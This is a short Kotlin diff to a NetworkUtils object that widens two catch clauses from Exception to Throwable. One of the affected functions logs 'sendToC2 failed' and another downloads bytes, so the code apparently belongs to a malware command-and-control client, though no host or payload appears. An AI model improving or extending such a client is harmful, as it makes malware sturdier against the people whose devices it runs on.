@@ -33,7 +33,7 @@ object NetworkUtils {
             val responseCode = conn.responseCode
             conn.disconnect()
             responseCode == 200
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "sendToC2 failed", e)
             false
         }
@@ -55,7 +55,7 @@ object NetworkUtils {
             inputStream.close()
             conn.disconnect()
             bytes
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e(TAG, "downloadBytes failed", e)
             null
         }
